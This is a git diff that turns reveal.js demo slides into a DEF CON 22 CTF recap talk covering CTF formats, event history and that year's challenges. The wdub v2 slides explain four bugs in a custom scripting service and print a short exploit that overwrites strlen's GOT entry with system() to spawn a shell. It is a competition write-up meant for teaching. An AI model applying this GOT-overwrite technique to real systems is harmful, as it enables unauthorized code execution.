@@ -1,394 +1,424 @@
 <!doctype html>
-<html lang="en">
+<html lang="en">	
+<head>
+	<meta charset="utf-8">
+	<title>DEF CON 22 CTF Wrapup</title>
+	<link rel="stylesheet" href="css/reveal.min.css">
+	<link rel="stylesheet" href="css/theme/moon.css" id="theme">	
+</head>
 
-	<head>
-		<meta charset="utf-8">
+<body>
+	<div class="reveal">
+		<div class="slides">
 
-		<title>reveal.js - The HTML Presentation Framework</title>
+			<section>
+				<h1>DEF CON 22 CTF Recap</h1>
+				<img src="images/title.jpg" />
+			</section>
 
-		<meta name="description" content="A framework for easily creating beautiful presentations using HTML">
-		<meta name="author" content="Hakim El Hattab">
+			<section>
+				<h1>Peter/Psifertex</h1>
+				<ul>
+					<li>We play CTFs.</li>
+					<li>Part of the team that runs <a href="http://ghostintheshellcode.com/">Ghost in the Shellcode</a> at ShmooCon</li>
+				</ul>
+			</section>
 
-		<meta name="apple-mobile-web-app-capable" content="yes" />
-		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+			<section>
+				<h1>Play along!</h1>
+				<p>We've created a mirror of the game to run here tonight, if you already know all about CTFs and just want to play with the challenges, see below. Note that eliza-v1 isn't running because it requires a custom patch to qemu-i386-user that isn't public yet.</p>
+				<br />
+				<h2>SSID: dc22ctf (no key)</h2>
+				<h2>http://dc22ctf.local/</h2>
+			</section>
 
-		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-
-		<link rel="stylesheet" href="css/reveal.min.css">
-		<link rel="stylesheet" href="css/theme/default.css" id="theme">
-
-		<!-- For syntax highlighting -->
-		<link rel="stylesheet" href="lib/css/zenburn.css">
-
-		<!-- If the query includes 'print-pdf', include the PDF print sheet -->
-		<script>
-			if( window.location.search.match( /print-pdf/gi ) ) {
-				var link = document.createElement( 'link' );
-				link.rel = 'stylesheet';
-				link.type = 'text/css';
-				link.href = 'css/print/pdf.css';
-				document.getElementsByTagName( 'head' )[0].appendChild( link );
-			}
-		</script>
-
-		<!--[if lt IE 9]>
-		<script src="lib/js/html5shiv.js"></script>
-		<![endif]-->
-	</head>
-
-	<body>
-
-		<div class="reveal">
-
-			<!-- Any section element inside of this container is displayed as a slide -->
-			<div class="slides">
+			<section>
+				
 				<section>
-					<h1>Reveal.js</h1>
-					<h3>HTML Presentations Made Easy</h3>
-					<p>
-						<small>Created by <a href="http://hakim.se">Hakim El Hattab</a> / <a href="http://twitter.com/hakimel">@hakimel</a></small>
-					</p>
-				</section>
-
-				<section>
-					<h2>Heads Up</h2>
-					<p>
-						reveal.js is a framework for easily creating beautiful presentations using HTML. You'll need a browser with
-						support for CSS 3D transforms to see it in its full glory.
-					</p>
-
-					<aside class="notes">
-						Oh hey, these are some notes. They'll be hidden in your presentation, but you can see them if you open the speaker notes window (hit 's' on your keyboard).
-					</aside>
-				</section>
-
-				<!-- Example of nested vertical slides -->
-				<section>
-					<section>
-						<h2>Vertical Slides</h2>
-						<p>
-							Slides can be nested inside of other slides,
-							try pressing <a href="#" class="navigate-down">down</a>.
-						</p>
-						<a href="#" class="image navigate-down">
-							<img width="178" height="238" src="https://s3.amazonaws.com/hakim-static/reveal-js/arrow.png" alt="Down arrow">
-						</a>
-					</section>
-					<section>
-						<h2>Basement Level 1</h2>
-						<p>Press down or up to navigate.</p>
-					</section>
-					<section>
-						<h2>Basement Level 2</h2>
-						<p>Cornify</p>
-						<a class="test" href="http://cornify.com">
-							<img width="280" height="326" src="https://s3.amazonaws.com/hakim-static/reveal-js/cornify.gif" alt="Unicorn">
-						</a>
-					</section>
-					<section>
-						<h2>Basement Level 3</h2>
-						<p>That's it, time to go back up.</p>
-						<a href="#/2" class="image">
-							<img width="178" height="238" src="https://s3.amazonaws.com/hakim-static/reveal-js/arrow.png" alt="Up arrow" style="-webkit-transform: rotate(180deg);">
-						</a>
-					</section>
-				</section>
-
-				<section>
-					<h2>Slides</h2>
-					<p>
-						Not a coder? No problem. There's a fully-featured visual editor for authoring these, try it out at <a href="http://slid.es" target="_blank">http://slid.es</a>.
-					</p>
-				</section>
-
-				<section>
-					<h2>Point of View</h2>
-					<p>
-						Press <strong>ESC</strong> to enter the slide overview.
-					</p>
-					<p>
-						Hold down alt and click on any element to zoom in on it using <a href="http://lab.hakim.se/zoom-js">zoom.js</a>. Alt + click anywhere to zoom back out.
-					</p>
-				</section>
-
-				<section>
-					<h2>Works in Mobile Safari</h2>
-					<p>
-						Try it out! You can swipe through the slides and pinch your way to the overview.
-					</p>
-				</section>
-
-				<section>
-					<h2>Marvelous Unordered List</h2>
-					<ul>
-						<li>No order here</li>
-						<li>Or here</li>
-						<li>Or here</li>
-						<li>Or here</li>
-					</ul>
-				</section>
-
-				<section>
-					<h2>Fantastic Ordered List</h2>
+					<h1>CTFs In general</h1>
+					<aside class="notes">Lots of popular styles, wargames, programming challenges, <a href="http://topcoder.com/">TopCoder</a>, etc. We're primarily focusing on three main types:</notes>
 					<ol>
-						<li>One is smaller than...</li>
-						<li>Two is smaller than...</li>
-						<li>Three!</li>
-					</ol>
-				</section>
-
-				<section data-markdown>
-					<script type="text/template">
-						## Markdown support
-
-						For those of you who like that sort of thing. Instructions and a bit more info available [here](https://github.com/hakimel/reveal.js#markdown).
-
-						```
-						<section data-markdown>
-						  ## Markdown support
-
-						  For those of you who like that sort of thing.
-						  Instructions and a bit more info available [here](https://github.com/hakimel/reveal.js#markdown).
-						</section>
-						```
-					</script>
-				</section>
-
-				<section id="transitions">
-					<h2>Transition Styles</h2>
-					<p>
-						You can select from different transitions, like: <br>
-						<a href="?transition=cube#/transitions">Cube</a> -
-						<a href="?transition=page#/transitions">Page</a> -
-						<a href="?transition=concave#/transitions">Concave</a> -
-						<a href="?transition=zoom#/transitions">Zoom</a> -
-						<a href="?transition=linear#/transitions">Linear</a> -
-						<a href="?transition=fade#/transitions">Fade</a> -
-						<a href="?transition=none#/transitions">None</a> -
-						<a href="?#/transitions">Default</a>
-					</p>
-				</section>
-
-				<section id="themes">
-					<h2>Themes</h2>
-					<p>
-						Reveal.js comes with a few themes built in: <br>
-						<a href="?#/themes">Default</a> -
-						<a href="?theme=sky#/themes">Sky</a> -
-						<a href="?theme=beige#/themes">Beige</a> -
-						<a href="?theme=simple#/themes">Simple</a> -
-						<a href="?theme=serif#/themes">Serif</a> -
-						<a href="?theme=night#/themes">Night</a> <br>
-						<a href="?theme=moon#/themes">Moon</a> -
-						<a href="?theme=solarized#/themes">Solarized</a>
-					</p>
-					<p>
-						<small>
-							* Theme demos are loaded after the presentation which leads to flicker. In production you should load your theme in the <code>&lt;head&gt;</code> using a <code>&lt;link&gt;</code>.
-						</small>
-					</p>
+						<li>Red Team</li>
+						<li>Blue Team</li>
+						<li>Full Spectrum (sometimes called "Attack/Defense", or "A/D")</li>
 				</section>
 
 				<section>
-					<h2>Global State</h2>
-					<p>
-						Set <code>data-state="something"</code> on a slide and <code>"something"</code>
-						will be added as a class to the document element when the slide is open. This lets you
-						apply broader style changes, like switching the background.
-					</p>
-				</section>
-
-				<section data-state="customevent">
-					<h2>Custom Events</h2>
-					<p>
-						Additionally custom events can be triggered on a per slide basis by binding to the <code>data-state</code> name.
-					</p>
-					<pre><code data-trim contenteditable style="font-size: 18px; margin-top: 20px;">
-Reveal.addEventListener( 'customevent', function() {
-	console.log( '"customevent" has fired' );
-} );
-					</code></pre>
+					<h1>Red Team</h1>
+					<img src="images/red-team.png" />
 				</section>
 
 				<section>
-					<section data-background="#007777">
-						<h2>Slide Backgrounds</h2>
-						<p>
-							Set <code>data-background="#007777"</code> on a slide to change the full page background to the given color. All CSS color formats are supported.
-						</p>
-						<a href="#" class="image navigate-down">
-							<img width="178" height="238" src="https://s3.amazonaws.com/hakim-static/reveal-js/arrow.png" alt="Down arrow">
-						</a>
-					</section>
-					<section data-background="https://s3.amazonaws.com/hakim-static/reveal-js/arrow.png">
-						<h2>Image Backgrounds</h2>
-						<pre><code>&lt;section data-background="image.png"&gt;</code></pre>
-					</section>
-					<section data-background="https://s3.amazonaws.com/hakim-static/reveal-js/arrow.png" data-background-repeat="repeat" data-background-size="100px">
-						<h2>Repeated Image Backgrounds</h2>
-						<pre><code style="word-wrap: break-word;">&lt;section data-background="image.png" data-background-repeat="repeat" data-background-size="100px"&gt;</code></pre>
-					</section>
-				</section>
-
-				<section data-transition="linear" data-background="#4d7e65" data-background-transition="slide">
-					<h2>Background Transitions</h2>
-					<p>
-						Pass reveal.js the <code>backgroundTransition: 'slide'</code> config argument to make backgrounds slide rather than fade.
-					</p>
-				</section>
-
-				<section data-transition="linear" data-background="#8c4738" data-background-transition="slide">
-					<h2>Background Transition Override</h2>
-					<p>
-						You can override background transitions per slide by using <code>data-background-transition="slide"</code>.
-					</p>
-				</section>
-
-				<section>
-					<h2>Clever Quotes</h2>
-					<p>
-						These guys come in two forms, inline: <q cite="http://searchservervirtualization.techtarget.com/definition/Our-Favorite-Technology-Quotations">
-						&ldquo;The nice thing about standards is that there are so many to choose from&rdquo;</q> and block:
-					</p>
-					<blockquote cite="http://searchservervirtualization.techtarget.com/definition/Our-Favorite-Technology-Quotations">
-						&ldquo;For years there has been a theory that millions of monkeys typing at random on millions of typewriters would
-						reproduce the entire works of Shakespeare. The Internet has proven this theory to be untrue.&rdquo;
-					</blockquote>
-				</section>
-
-				<section>
-					<h2>Pretty Code</h2>
-					<pre><code data-trim contenteditable>
-function linkify( selector ) {
-  if( supports3DTransforms ) {
-
-    var nodes = document.querySelectorAll( selector );
-
-    for( var i = 0, len = nodes.length; i &lt; len; i++ ) {
-      var node = nodes[i];
-
-      if( !node.className ) {
-        node.className += ' roll';
-      }
-    }
-  }
-}
-					</code></pre>
-					<p>Courtesy of <a href="http://softwaremaniacs.org/soft/highlight/en/description/">highlight.js</a>.</p>
-				</section>
-
-				<section>
-					<h2>Intergalactic Interconnections</h2>
-					<p>
-						You can link between slides internally,
-						<a href="#/2/3">like this</a>.
-					</p>
-				</section>
-
-				<section>
-					<section id="fragments">
-						<h2>Fragmented Views</h2>
-						<p>Hit the next arrow...</p>
-						<p class="fragment">... to step through ...</p>
-						<ol>
-							<li class="fragment"><code>any type</code></li>
-							<li class="fragment"><em>of view</em></li>
-							<li class="fragment"><strong>fragments</strong></li>
-						</ol>
-
-						<aside class="notes">
-							This slide has fragments which are also stepped through in the notes window.
-						</aside>
-					</section>
-					<section>
-						<h2>Fragment Styles</h2>
-						<p>There's a few styles of fragments, like:</p>
-						<p class="fragment grow">grow</p>
-						<p class="fragment shrink">shrink</p>
-						<p class="fragment roll-in">roll-in</p>
-						<p class="fragment fade-out">fade-out</p>
-						<p class="fragment highlight-red">highlight-red</p>
-						<p class="fragment highlight-green">highlight-green</p>
-						<p class="fragment highlight-blue">highlight-blue</p>
-						<p class="fragment current-visible">current-visible</p>
-						<p class="fragment highlight-current-blue">highlight-current-blue</p>
-					</section>
-				</section>
-
-				<section>
-					<h2>Spectacular image!</h2>
-					<a class="image" href="http://lab.hakim.se/meny/" target="_blank">
-						<img width="320" height="299" src="http://s3.amazonaws.com/hakim-static/portfolio/images/meny.png" alt="Meny">
-					</a>
-				</section>
-
-				<section>
-					<h2>Export to PDF</h2>
-					<p>Presentations can be <a href="https://github.com/hakimel/reveal.js#pdf-export">exported to PDF</a>, below is an example that's been uploaded to SlideShare.</p>
-					<iframe id="slideshare" src="http://www.slideshare.net/slideshow/embed_code/13872948" width="455" height="356" style="margin:0;overflow:hidden;border:1px solid #CCC;border-width:1px 1px 0;margin-bottom:5px" allowfullscreen> </iframe>
-					<script>
-						document.getElementById('slideshare').attributeName = 'allowfullscreen';
-					</script>
-				</section>
-
-				<section>
-					<h2>Take a Moment</h2>
-					<p>
-						Press b or period on your keyboard to enter the 'paused' mode. This mode is helpful when you want to take distracting slides off the screen
-						during a presentation.
-					</p>
-				</section>
-
-				<section>
-					<h2>Stellar Links</h2>
+					<h1>Red Team</h1>
+					<aside class="notes">Organizers of the game act as the defenders, setting up static challenges for the participants to try solving. These often look like Jeopardy style boards. DEF CON quals is an example of this type of event.</aside>
 					<ul>
-						<li><a href="http://slid.es">Try the online editor</a></li>
-						<li><a href="https://github.com/hakimel/reveal.js">Source code on GitHub</a></li>
-						<li><a href="http://twitter.com/hakimel">Follow me on Twitter</a></li>
+						<li>DEF CON Qualifiers</li>
+						<li>Plaid CTF</li>
+						<li>CODEGATE Qualifiers</li>
+						<li>Ghost in the Shellcode</li>
 					</ul>
 				</section>
 
 				<section>
-					<h1>THE END</h1>
-					<h3>BY Hakim El Hattab / hakim.se</h3>
+					<h1>Blue Team</h1>
+					<img src="images/blue-team.png" />
 				</section>
+
+				<section>
+					<h1>Blue Team</h1>
+					<aside class="notes">The least-interesting challenges, these are more system administration exercises and involve the organizers (or an independent group from the organizers, but not official the participants) gettin to do all the offense, with the particpants defending their systems from attack.</aside>
+					<ul>
+						<li>CCDC</li>
+						<li>CDX</li>
+						<li>"Cyber Patriot" (which is apparently inspiring a similar event here in the UK)</li>
+					</ul>
+				</section>
+
+				<section>
+					<h1>Full Spectrum</h1>
+					<img src="images/full-spectrum.png" />
+				</section>
+
+				<section>
+					<h1>Full Spectrum</h1>
+					<aside class="notes">My favorite, but also the hardest to set up and run. Particpants are both the defenders and the attackers at the same time. Requires far more team coordination, game-theory, and hair-pulling than any other format.</aside>
+					<ul>
+						<li>DEF CON CTF Finals</li>
+						<li>CODEGATE Finals</li>
+						<li>rwthCTF</li>
+						<li>RuCTF Finals</li>
+					</ul>
+				</section>
+
+			</section>
+
+			<section>
+				<h1>DEF CON CTF Highlights</h1>
+				<table>
+					<thead style="font-weight: bold;">
+						<td>YEAR</td>
+						<td>DC</td>
+						<td>CTF</td>
+						<td>ORG</td>
+						<td>NOTES</td>
+					</thead>
+					<tr>
+						<td>1996</td>
+						<td>4</td>
+						<td>1</td>
+						<td>DEF CON Staff</td>
+						<td>First official CTF</td>
+					</tr>
+					<tr>
+						<td>2004</td>
+						<td>12</td>
+						<td>9</td>
+						<td>Ghetto Hackers</td>
+						<td>Modern A/D Precursor</td>
+					</tr>
+					<tr>
+						<td>2005</td>
+						<td>13</td>
+						<td>10</td>
+						<td>Kenshoto</td>
+						<td>First qualifier</td>
+					</tr>
+					<!--
+					<tr>
+						<td>2006</td>
+						<td>14</td>
+						<td>11</td>
+						<td>Kenshoto</td>
+						<td>Solaris, DTMF</td>
+					</tr>
+					<tr>
+						<td>...</td>
+						<td>...</td>
+						<td>...</td>
+						<td>...</td>
+						<td>...</td>
+					</tr>
+					-->
+					<tr>
+						<td>2009</td>
+						<td>17</td>
+						<td>14</td>
+						<td>DDTEK</td>
+						<td>"New" Organizesr</td>
+					</tr>
+					<tr>
+						<td>2013</td>
+						<td>21</td>
+						<td>17</td>
+						<td>LegitBS</td>
+						<td>New Organizers</td>
+					</tr>
+					<tr>
+						<td>2014</td>
+						<td>22</td>
+						<td>18</td>
+						<td>LegitBS</td>
+						<td></td>
+					</tr>
+				</table>
+			</section>
+
+			<section>
+				<h1>The Game</h1>
+				<img src="images/defcon-finals-2014.png">
+			</section>
+			`
+			<section>
+				<h1>The Game</h1>
+				<img src="images/gameinterface.png">
+			</section>
+
+			<section>
+				<h1>Visualization</h1>
+				<video class="stretch" data-autoplay src="images/captures.mp4"></video>
+			</section>
+
+
+			<section>
+				<h1>This Year's Challenges</h1>
+				<ul>
+					<li>badger (MSP430)</li>
+					<li>justify (ARM)</li>
+					<li>eliza (v1 i386,v2 ARM)</li>
+					<li>imap (v1 ARM,v2 ARM)</li>
+					<li>wdub (v1 ARM Thumb 2,v2 ARM Thumb 2)</li>
+				</ul>
+			</section>
+
+			<section>
+
+				<section>
+					<h1>badger</h1>
+					<img src="images/badger.jpg">
+				</section>
+
+				<section>
+					<h1>badger</h1>
+					<ul>
+						<li>XILINX Spartan 6 FPGA </li>
+						<li>Running two OpenMSP430 cores</li>
+						<li>One core handled the radio/management</li>
+						<li>The other was the challenge logic</li>
+						<li>Message passing service between badges</li>
+				</section>
+
+			</section>
+
+
+			<section>
+				<h1>justify</h1>
+				<p class="fragment"><a href='https://google.com/search?q="p+cnf"'>https://google.com/search?q="p+cnf"</a></p>
+				<pre><code class="stretch fragment" data-trim>
+  c  sample-cnf-file.cnf
+  c
+  p cnf 3 2
+  1 -3 0
+  2 3 -1 0
+				</code></pre>
+				<p class="fragment">Tells us the format, would have saved a bunch of reversing. Known as "<a href="http://fairmut3x.wordpress.com/2011/07/29/cnf-conjunctive-normal-form-dimacs-format-explained/">Conjunctive Normal Form</a>".</p>
+			</section>
+
+			<section id="eliza">
+				<h1>eliza</h1>
+				<ul>
+					<li>Tradewars-like game</li>
+				</ul>
+			</section>
+
+			<section id="imap">
+				<h1>imap</h1>
+				<ul>
+					<li>custom imap server, protocol shot fairly boring</li>
+				</ul>
+			</section>
+
+			<section>
+				<section id="wdubv1">
+					<h1>wdub v1</h1>
+					<ul>
+						<li>Supports basic HTTP verbs</li>
+						<li>Integer overflow in x-offset HTTP header</li>
+					</ul>
+				</section>
+
+				<section id="wdubv2">
+					<h1>wdub v2</h1>
+					<ul>
+						<li>New HTTP Verb added: EVAL</li>
+						<li>Supports "interesting" command-set</li>
+					<pre><code data-trim>
+Yo, nomo, gimme, exite, borit, bonut, dupme, makeit, bandit, mogain, slipitin,
+slapitup, oudahere, putdatder, pobastard, datbettah, eatdatshit, screwdatshit,
+splitdatshit, deyseemerollin, dayseemeshiftin
+					</code></pre>
+						<li>"like PHP"</li>
+					</ul>
+				</section>
+
+				<section id="yodawg">
+					<h1>YoDog</h1>
+					<p>Simple syntax. Either:</p>
+					<pre><code data-trim>
+&lt;variable&gt; = &lt;command&gt; &lt;arg1&gt; … &lt;argN&gt;;
+					</code></pre>
+					<p>Or:</p>
+					<pre><code data-trim>
+&lt;command&gt; &lt;arg1&gt; … &lt;argN&gt;;
+					</code></pre>
+					<p>Where &lt;arg?&gt; is either a variable or a number</p>
+				</section>
+
+				<section id="yodawgsample">
+					<h1>YoDawg Sample</h1>
+					<pre><code data-trim>
+foo = shebewalkinfunny 10;  //create the dword variable foo with value 10
+bar = gimme 20;             //create a variable bar 20 bytes long
+bonut bar 1;                //invert the byte at bar[1]
+Yo bar;                     //print the contents of bar
+</code></pre>
+				</section>
+
+				<section id="yodawgvuln1">
+					<h1>YoDawg Vuln 1</h1>
+					<h2>Oudahere - Information Disclosrue</h2>
+					<ul>
+						<li>Command removes a range of data from a buffer</li>
+					</ul>
+					<code>oudahere varbuf1 0 10;</code>
+					<ul>
+						<li>Removes first 10 bytes from varbuf1 starting at offset 0</li>
+						<li>However there is an integer overflow allowing the read of arbitrary memory</li>
+					</ul>
+				</section>
+
+				<section id="yodawgvuln2">
+					<h1>YoDawg Vuln 2</h1>
+					<h2>Dupme - Use-after-free</h2>
+					<ul>
+						<li>Supposed to duplicate a buffer but fails to do a deep copy</li>
+						<li>This means two variables can point at the same data</li>
+						<li>When the first is freed the second one points at freed data</li>
+						<li>So if we have variables <code>a</code> and <code>bI</code>:</li>
+						<ul>
+							<li>allocate a</li>
+							<li>duplicate a onto b (both a and b point to a's data)</li>
+							<li>free a</li>
+							<li>allocate c (now b's data is c's metadata)</li>
+						</ul>
+					</ul>
+				</section>
+
+				<section id="yodawgvuln3">
+					<h1>YoDawg Vuln 3</h1>
+					<h2>Putitin – Integer overflow</h2>
+					<ul>
+						<li>Writes a variable into an array</li>
+						<li>Aray length validation is busted</li>
+					</ul>
+					<pre><code>
+if (b-&gt;value + 4 &lt; c-&gt;size)
+	memcpy(c-&gt;data[b-&gt;value], c-&gt;data, 4);
+					</code></pre>
+				</section>
+
+				<section id="yodawgvuln4">
+					<h1>YoDawg Vuln 4</h1>
+					<h2>Bonut – Buffer overflow</h2>
+					<ul>
+						<li>bitwise inversion command</li>
+						<li>Validates array index, but fails</li>
+					</ul>
+					<h3>Actual code</h3>
+					<pre><code>
+if (strlen(b-&gt;data) &lt; c-&gt;size)
+	~c-&gt;data[atoi(b-&gt;data)];
+					</code></pre>
+					<h3>Correct code</h3>
+					<pre><code>
+if (<font color="red">atoi</font>(b-&gt;data) &lt; c-&gt;size)
+	~c-&gt;data[atoi(b-&gt;data)];
+					</code></pre>
+				</section>
+
+				<section id="whattodo">
+					<h1>Pwn with a ~</h1>
+					<ul>
+						<li>Fortunately the bytes previous to my data is the length of my data</li>
+						<li>Thus we bitwise invert the length  of my data we can make it much longer</li>
+						<li>Giving us a variable whose data size spans all of memory</li>
+						<li>Because no ASLR, no RELRO and we can read and write all of memory</li>
+					</ul>
+				</section>
+
+				<section id="exploitation">
+					<h1>Exploitation Plan</h1>
+					<ul>
+						<li>First we create an variable <code>A</code> whose data points at <code>strlen()</code></li>
+						<li>Next we use an <code>eatdatshit</code> operation which subtracts a dword from a dword. </li>
+						<ul>
+							<li>We subtract the difference between <code>strlen()</code> and <code>system()</code></li>
+							<li>Now the next thing that calls strlen will call <code>system()</code> instead</li>
+						</ul>
+						<li>Finally allocate a new variable called <code>/bin/sh</code></li>
+						<ul>
+							<li>This tries to do <code>strlen("/bin/sh")</code> but actually does <code>system("/bin/sh")</code></li>
+							<li>Since this service is run via xinetd we drop to a shell</li>
+						</ul>
+					</ul>
+				</section>
+
+				<section id="exploitsample">
+					<h1>Exploit</h1>
+					<pre><code data-trim>
+B = gimme 10;                 //record we will exploit
+C = gimme 128;                //record we will write to the GOT with
+bonut B -1;                   //invert they byte of our length 
+D = shebewalkinfunny 106612;  //put the address of strlen GOT entry into D
+putitin B D 192;              //write D into the pointer for C (an offset from B)
+F = shebewalkinfunny 3;       //put 3 -&gt; F, this is type value for a dword
+putitin B F 196;              //overwrite the type of C to be dword instead of string 
+C = eatdatshit C 168689;      //subtract distance between strlen() and system() in GOT
+/bin/sh = gimme 4;            //cause strlen() to be called
+					</code></pre>
+				</section>
+			</section>
+
+			<section>
+				<h1>Results</h1>
+				<p><a href="https://legitbs.net/2014/">https://legitbs.net/2014/</a></p>
+				<img src="images/LBS-wrapup.png">
+			</section>
+
+			<section>
+				<h1>Questions?</h1>
+				<p>Slides posted online: <a hef="http://twitter.com/psifertex">http://twitter.com/psifertex</a></p>
+			</section>
 
 			</div>
+	</div>
+	<script src="lib/js/head.min.js"></script>
+	<script src="js/reveal.min.js"></script>
 
-		</div>
+	<script>
+		Reveal.initialize({
+			transition: 'none',
+			transitionSpeed: 'hyper',
+			slideNumber: true,
+		    margin: 0.1,
+			width: 1024,
+			height: 768,
 
-		<script src="lib/js/head.min.js"></script>
-		<script src="js/reveal.min.js"></script>
+			/*
+		    parallaxBackgroundImage: 'https://s3.amazonaws.com/hakim-static/reveal-js/reveal-parallax-1.jpg',
+			parallaxBackgroundSize: '2100px 900px'
+			*/
 
-		<script>
-
-			// Full list of configuration options available here:
-			// https://github.com/hakimel/reveal.js#configuration
-			Reveal.initialize({
-				controls: true,
-				progress: true,
-				history: true,
-				center: true,
-
-				theme: Reveal.getQueryHash().theme, // available themes are in /css/theme
-				transition: Reveal.getQueryHash().transition || 'default', // default/cube/page/concave/zoom/linear/fade/none
-
-				// Parallax scrolling
-				// parallaxBackgroundImage: 'https://s3.amazonaws.com/hakim-static/reveal-js/reveal-parallax-1.jpg',
-				// parallaxBackgroundSize: '2100px 900px',
-
-				// Optional libraries used to extend on reveal.js
-				dependencies: [
-					{ src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
-					{ src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
-					{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
-					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
-					{ src: 'plugin/zoom-js/zoom.js', async: true, condition: function() { return !!document.body.classList; } },
-					{ src: 'plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } }
-				]
-			});
-
-		</script>
-
-	</body>
+		});
+	</script>
+</body>
 </html>
